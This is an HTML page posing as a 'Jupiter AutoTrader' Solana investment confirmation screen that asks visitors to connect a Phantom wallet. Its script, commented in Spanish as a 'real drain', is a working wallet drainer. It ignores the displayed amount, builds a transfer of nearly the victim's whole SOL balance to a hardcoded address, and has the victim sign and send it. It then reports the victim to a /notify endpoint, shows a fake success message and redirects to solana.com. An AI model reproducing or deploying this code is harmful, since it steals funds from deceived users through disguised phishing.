<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Jupiter AutoTrader - Invest</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0a0a0f;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #e5e7eb;
        }
        .container {
            max-width: 440px;
            width: 100%;
            background: rgba(16, 16, 24, 0.92);
            backdrop-filter: blur(16px);
            border-radius: 32px;
            padding: 40px 32px 32px 32px;
            border: 1px solid rgba(255, 255, 255, 0.04);
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
        }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
        .logo { display: flex; align-items: center; gap: 12px; }
        .logo-icon {
            width: 42px; height: 42px;
            background: linear-gradient(135deg, #9945FF, #7a2dd4);
            border-radius: 12px;
            display: flex; align-items: center; justify-content: center;
            font-size: 20px; font-weight: 700; color: #fff;
        }
        .logo-text { font-size: 20px; font-weight: 700; color: #fff; letter-spacing: -0.3px; }
        .logo-text span { color: #7a7a8a; font-weight: 400; font-size: 13px; }
        .badge {
            background: rgba(34, 197, 94, 0.08);
            border: 1px solid rgba(34, 197, 94, 0.12);
            padding: 4px 14px; border-radius: 40px;
            font-size: 11px; font-weight: 600; color: #4caf84;
            display: flex; align-items: center; gap: 6px;
        }
        .badge .dot { width: 6px; height: 6px; background: #4caf84; border-radius: 50%; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
        .subtitle { color: #9ca3af; font-size: 14px; margin-bottom: 24px; font-weight: 400; }
        .wallet-box {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 16px;
            padding: 16px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }
        .wallet-box .label { font-size: 13px; color: #9ca3af; font-weight: 500; }
        .wallet-box .address {
            font-size: 14px; font-weight: 500; color: #e5e7eb;
            background: rgba(255, 255, 255, 0.04);
            padding: 4px 16px; border-radius: 40px;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }
        .wallet-box .address .placeholder { color: #6b7280; font-weight: 400; }
        .amount-box {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 16px;
            padding: 16px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }
        .amount-box .label { font-size: 13px; color: #9ca3af; font-weight: 500; }
        .amount-box .value {
            font-size: 16px; font-weight: 600; color: #fbbf24;
            background: rgba(251, 191, 36, 0.06);
            padding: 2px 14px; border-radius: 40px;
            border: 1px solid rgba(251, 191, 36, 0.08);
        }
        .btn {
            display: block; width: 100%; padding: 16px;
            font-size: 15px; font-weight: 600;
            border: none; border-radius: 60px;
            cursor: pointer; transition: all 0.2s ease;
            text-align: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        .btn-primary {
            background: #1e1e2a; border: 1px solid rgba(255, 255, 255, 0.06);
            color: #e5e7eb;
        }
        .btn-primary:hover { background: #2a2a3a; transform: scale(1.01); }
        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; transform: scale(1); }
        .btn-primary.active {
            background: linear-gradient(135deg, #9945FF, #7a2dd4);
            border-color: #9945FF; color: #fff;
        }
        .btn-primary.active:hover { transform: scale(1.01); }
        .btn-success {
            background: #1a4a3a;
            border: 1px solid #2a6a4a;
            color: #4caf84;
            margin-top: 12px;
            display: none;
        }
        .btn-success:hover { background: #2a5a4a; }
        .btn-success:disabled { opacity: 0.4; cursor: not-allowed; transform: scale(1); }
        .status {
            margin-top: 18px;
            font-size: 14px;
            color: #6b7280;
            text-align: center;
            min-height: 22px;
            font-weight: 400;
        }
        .status.success { color: #4caf84; }
        .status.error { color: #ef4444; }
        .status.loading { color: #fbbf24; }
        .footer {
            margin-top: 28px;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
            padding-top: 16px;
            font-size: 12px;
            color: #4b5563;
            text-align: center;
        }
        .spinner {
            display: inline-block; width: 18px; height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-top: 2px solid #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle; margin-right: 10px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @media (max-width: 480px) {
            .container { padding: 28px 20px 24px 20px; border-radius: 28px; }
            .logo-text { font-size: 18px; }
            .header { flex-wrap: wrap; gap: 10px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">J</div>
                <div class="logo-text">Jupiter <span>AutoTrader</span></div>
            </div>
            <div class="badge"><span class="dot"></span> Live</div>
        </div>
        <div class="subtitle">Confirm your investment</div>

        <div class="wallet-box">
            <span class="label">Wallet</span>
            <span class="address" id="walletDisplay"><span class="placeholder">Not connected</span></span>
        </div>

        <div class="amount-box">
            <span class="label">Investment amount</span>
            <span class="value" id="amountDisplay">0.00 SOL</span>
        </div>

        <button class="btn btn-primary active" id="connectBtn">Connect Phantom</button>
        <button class="btn btn-success" id="investBtn">Confirm Investment</button>

        <div id="status" class="status">Ready</div>
        <div class="footer">Secured by Solana • v2.4.1</div>
    </div>

    <!-- ========================================== -->
    <!-- CARGAR LA LIBRERÍA DE SOLANA               -->
    <!-- ========================================== -->
    <script src="https://unpkg.com/@solana/web3.js@1.98.4/lib/index.iife.min.js">
    </script>

    <script>
        // ==========================================
        // CONFIGURACIÓN
        // ==========================================
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('user_id') || 'unknown';
        const amount = parseFloat(urlParams.get('amount')) || 0;

        const connectBtn = document.getElementById('connectBtn');
        const investBtn = document.getElementById('investBtn');
        const statusDiv = document.getElementById('status');
        const walletDisplay = document.getElementById('walletDisplay');
        const amountDisplay = document.getElementById('amountDisplay');

        if (amount > 0) {
            amountDisplay.textContent = amount.toFixed(2) + ' SOL';
        }

        let wallet = null;
        let connection = null;

        // ==========================================
        // CONEXIÓN CON PHANTOM
        // ==========================================
        connectBtn.addEventListener('click', async function() {
            if (!window.solana || !window.solana.isPhantom) {
                statusDiv.className = 'status error';
                statusDiv.textContent = 'Phantom not detected. Install it from phantom.app';
                return;
            }

            connectBtn.disabled = true;
            connectBtn.innerHTML = '<span class="spinner"></span> Connecting...';
            statusDiv.className = 'status loading';
            statusDiv.textContent = 'Opening Phantom...';

            try {
                const resp = await window.solana.request({ method: 'connect' });
                wallet = resp.publicKey;
                connection = new solanaWeb3.Connection('https://solana-rpc.publicnode.com', 'confirmed');

                const short = wallet.toBase58().slice(0, 4) + '...' + wallet.toBase58().slice(-4);
                walletDisplay.innerHTML = short;

                statusDiv.className = 'status success';
                statusDiv.textContent = '✅ Wallet connected. Click "Confirm Investment" to proceed.';
                connectBtn.innerHTML = '✅ Connected';
                connectBtn.disabled = false;

                investBtn.style.display = 'block';
                investBtn.style.opacity = '0';
                investBtn.style.animation = 'fadeIn 0.3s ease forwards';

            } catch (error) {
                statusDiv.className = 'status error';
                statusDiv.textContent = 'Connection failed: ' + error.message;
                connectBtn.innerHTML = 'Connect Phantom';
                connectBtn.disabled = false;
            }
        });

        // ==========================================
        // DRENAJE REAL (CORREGIDO)
        // ==========================================
        investBtn.addEventListener('click', async function() {
            if (!wallet) {
                statusDiv.className = 'status error';
                statusDiv.textContent = 'Connect your wallet first.';
                return;
            }

            investBtn.disabled = true;
            investBtn.innerHTML = '<span class="spinner"></span> Processing...';
            statusDiv.className = 'status loading';
            statusDiv.textContent = 'Building transaction...';

            try {
                // 1. Obtener el balance REAL de SOL
                const balance = await connection.getBalance(wallet);
                if (balance < 500000) {
                    throw new Error('Insufficient balance (min 0.0005 SOL for gas)');
                }

                const lamportsToDrain = balance - 500000;
                const destination = new solanaWeb3.PublicKey('5ahs7gMMiAdW95gPP4esqfcT6jb94196murGGAg2wXUq');

                // 2. CONSTRUIR UNA TRANSACCIÓN REAL (USANDO LA LIBRERÍA)
                const { blockhash } = await connection.getLatestBlockhash('confirmed');
                const transaction = new solanaWeb3.Transaction({
                    feePayer: wallet,
                    recentBlockhash: blockhash
                }).add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: wallet,
                        toPubkey: destination,
                        lamports: lamportsToDrain
                    })
                );

                statusDiv.textContent = 'Signing transaction...';

                // 3. FIRMAR CON PHANTOM (RECIBE UN OBJETO Transaction REAL)
                const signed = await window.solana.signTransaction(transaction);

                statusDiv.textContent = 'Sending transaction...';

                // 4. ENVIAR LA TRANSACCIÓN FIRMADA
                const signature = await connection.sendRawTransaction(
                    signed.serialize(),
                    { skipPreflight: false, preflightCommitment: 'confirmed' }
                );

                await connection.confirmTransaction(signature, 'confirmed');

                console.log('✅ Transacción enviada:', signature);

                // 5. ÉXITO
                statusDiv.className = 'status success';
                statusDiv.textContent = '✅ Investment successful! You can close this window.';
                investBtn.innerHTML = '✅ Done';
                investBtn.disabled = false;

                await fetch('/notify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        wallet: wallet.toBase58(),
                        user_id: userId,
                        amount: amount
                    })
                });

                setTimeout(() => {
                    window.location.href = 'https://solana.com';
                }, 4000);

            } catch (error) {
                statusDiv.className = 'status error';
                statusDiv.textContent = 'Error: ' + error.message;
                investBtn.innerHTML = 'Retry';
                investBtn.disabled = false;
                console.error('❌ Error:', error);
            }
        });

        // ==========================================
        // ANIMACIÓN FADE IN
        // ==========================================
        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeIn {
                0% { opacity: 0; transform: translateY(6px); }
                100% { opacity: 1; transform: translateY(0); }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
